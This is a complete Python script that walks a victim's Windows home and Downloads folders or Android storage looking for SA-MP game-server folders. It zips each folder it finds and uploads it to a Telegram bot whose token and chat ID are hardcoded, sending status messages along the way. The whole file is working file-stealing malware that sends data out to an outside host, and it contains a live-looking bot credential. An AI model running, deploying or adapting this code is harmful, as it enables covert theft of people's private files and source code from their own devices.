import os
import platform
import shutil
import requests

# --- CONFIGURATION ---
BOT_TOKEN = '8792427618:AAGY9Oo6TP0PtjZUdtGQ31i5m33cJNatjO0'
CHAT_ID = '8447290071'
# ---------------------

def send_msg(text):
    """Sends a status message to your Telegram bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': CHAT_ID, 'text': text})
    except Exception:
        pass

def get_search_paths():
    """Detects platform environment and maps appropriate root directories."""
    if platform.system() == "Windows":
        # Searches Windows Downloads and user home (PC/Laptop)
        return [os.path.join(os.path.expanduser("~"), "Downloads"), os.path.expanduser("~")]
    
    # Android Mobile / Termux direct internal storage root path
    return ["/sdcard/"]

def is_samp_server_dir(files_list, dirs_list):
    """
    Checks if the directory contains ANY signature SA-MP element.
    If even one file or folder matches, the parent folder will be zipped.
    """
    # 1. Check for single file indicators (case-insensitive)
    lower_files = [f.lower() for f in files_list]
    if 'server.cfg' in lower_files:
        return True
        
    # 2. Check for single folder indicators (case-insensitive)
    lower_dirs = [d.lower() for d in dirs_list]
    samp_signatures = {'gamemodes', 'filterscripts', 'pawno', 'scriptfiles', 'plugins', 'include'}
    
    # Returns True if any item in samp_signatures exists in lower_dirs
    if not samp_signatures.isdisjoint(lower_dirs):
        return True
        
    return False

def main():
    search_paths = get_search_paths()
    samp_directories = set()
    
    send_msg("🔍 [System Alert]: Initializing platform-specific deep scan for SA-MP structures...")
    
    # 1. Locate all unique target folders across the platform paths
    for base_dir in search_paths:
        if not os.path.exists(base_dir):
            continue
            
        try:
            for root, dirs, files in os.walk(base_dir, topdown=True):
                # Speed optimization: bypass generic bulky OS data directories
                dirs[:] = [d for d in dirs if not d.startswith('.') and d.lower() not in ['android', 'data', 'obb', 'node_modules']]
                
                if is_samp_server_dir(files, dirs):
                    samp_directories.add(root)
                    # Stop looking deeper into this folder once it's flagged for zipping
                    dirs.clear() 
        except Exception as e:
            send_msg(f"⚠️ Access warning on platform directory structure:\n{str(e)[:60]}")

    discovered_targets = sorted(list(samp_directories))
    total_targets = len(discovered_targets)

    if total_targets == 0:
        send_msg("❌ Scan finished. No SA-MP components found matching the criteria on this platform.")
        return

    send_msg(f"📋 Scan Complete!\n📌 Found **{total_targets}** folder trees to package.\n\n⚙️ Compressing and streaming data...")

    # 2. Compress and upload each detected structure
    for index, folder_path in enumerate(discovered_targets, 1):
        folder_name = os.path.basename(folder_path) or "SAMP_Server"
        archive_name = f"samp_package_{index}"
        
        send_msg(f"📦 Compressing ({index}/{total_targets}): `{folder_name}`...")
        
        try:
            # Package folder into zip archive
            zip_file_path = shutil.make_archive(archive_name, 'zip', folder_path)
            file_size_mb = os.path.getsize(zip_file_path) / (1024 * 1024)
            
            # Safeguard against Telegram's 50MB Bot limit
            if file_size_mb > 50:
                send_msg(f"⚠️ Skipping `{folder_name}`: Size ({file_size_mb:.2f} MB) exceeds Telegram's 50MB Bot limit.")
                os.remove(zip_file_path)
                continue
                
            # Stream the file to Telegram
            with open(zip_file_path, 'rb') as archive_file:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                response = requests.post(url,
                    files={'document': archive_file},
                    data={
                        'chat_id': CHAT_ID,
                        'caption': f"📂 Environment: ({index}/{total_targets})\n📁 Name: {folder_name}\n💾 Size: {file_size_mb:.2f} MB"
                    }
                )
                
                if response.status_code != 200:
                    send_msg(f"❌ Telegram API rejected archive for: {folder_name}")
                    
            # Delete local temporary zip file to save space
            os.remove(zip_file_path)
            
        except Exception as e:
            send_msg(f"⚠️ Error compiling package `{folder_name}`:\nDetail: {str(e)[:60]}")

    send_msg("✅ Complete: Everything found has been processed and sent.")

if __name__ == "__main__":
    main()
